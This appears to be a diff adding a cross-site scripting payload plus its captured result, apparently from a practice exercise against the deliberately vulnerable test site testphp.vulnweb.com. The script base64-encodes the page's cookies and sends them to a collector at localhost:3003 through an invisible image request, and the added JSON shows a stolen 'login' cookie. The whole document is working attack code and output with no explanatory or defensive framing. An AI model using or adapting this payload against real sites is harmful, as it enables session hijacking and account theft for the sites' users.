@@ -1,0 +1,23 @@
+<script>
+  var s = btoa(document.cookie);
+  var x = document.createElement("IMG");
+  x.setAttribute("src", "http://localhost:3003/xss?cookie=" + s);
+  x.setAttribute("width", "1");
+  x.setAttribute("width", "1");
+  document.body.appendChild(x);
+</script>
+
+[
+{
+"domain": "testphp.vulnweb.com",
+"hostOnly": true,
+"httpOnly": false,
+"name": "login",
+"path": "/",
+"sameSite": "unspecified",
+"secure": false,
+"session": true,
+"storeId": null,
+"value": "test%2Ftest"
+}
+]
